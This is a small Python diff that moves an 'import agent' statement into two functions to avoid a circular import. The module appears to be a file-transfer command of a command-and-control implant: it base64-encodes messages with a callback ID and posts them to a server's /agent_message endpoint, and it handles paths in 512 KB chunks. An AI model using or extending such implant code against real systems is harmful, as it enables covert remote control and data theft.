@@ -2,18 +2,19 @@ import os
 import math
 import json
 import base64
-import agent  # same process — SESSION and BASE_URL available after agent.py initializes
 
 CHUNK_SIZE = 512 * 1024  # 512 KB
 
 
 def _post_raw(callback_id, body):
+    import agent  # deferred to avoid circular import — agent.py imports this module
     encoded = base64.b64encode((callback_id + json.dumps(body)).encode())
     r = agent.SESSION.post(f"{agent.BASE_URL}/agent_message", data=encoded, timeout=30)
     return json.loads(base64.b64decode(r.content)[36:])
 
 
 def execute(params, task_id, callback_id):
+    import agent  # deferred to avoid circular import — agent.py imports this module
     try:
         parsed = json.loads(params)
         path = parsed.get("path", "").strip()
